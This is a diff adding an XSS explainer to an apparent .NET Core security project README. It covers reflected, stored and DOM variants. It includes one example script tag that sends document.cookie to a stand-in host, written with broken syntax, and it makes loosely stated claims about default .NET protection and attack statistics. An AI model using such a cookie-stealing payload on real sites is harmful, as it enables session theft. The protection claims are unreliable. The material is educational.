@@ -124,9 +124,17 @@ Also we can define more specific rules. I tried explain in project file. You can
 
 # Attacks
 ## XSS
+This is a kind of script vulnerability. Done by integrate harmful script in our HTML and JS files. There are 3 ways. But we can apply same solution all of them. Net Core provide solution as default. Again thanks great dot net. Not need to define in `Startup.cs` file. if we want we can disable it.
+```
+<script> new Image().\"http://example.com/readCookie/?account=\"+document.cookie\"</script>
+```
+as example, when this script integrated to our js codes it's send to own "domain". that's very simple process but so effective. XSS attacks are one of the most common forms of Web Attacks, and this type of attack accounts for 12.75% of all web attacks.
 ### Reflected
+Hacker is integrate scripts to browser in client side. Nevertheless we can block this scripts. He's can access a user data.
 ### Stored
+Hacker is integrate scripts to source code in server side. it's so dangerous. Hacker can access all users data.  
 ### Dom(Document Object Model)
+This way genrally weld up from trying to payload after # sign. 
 <!-- CONTACT -->
 ## Contact
 Muhammet İkbal KAZANCI - [LinkedIn](https://www.linkedin.com/in/ikbalkazanc/) - mi.kazanci@hotmail.com
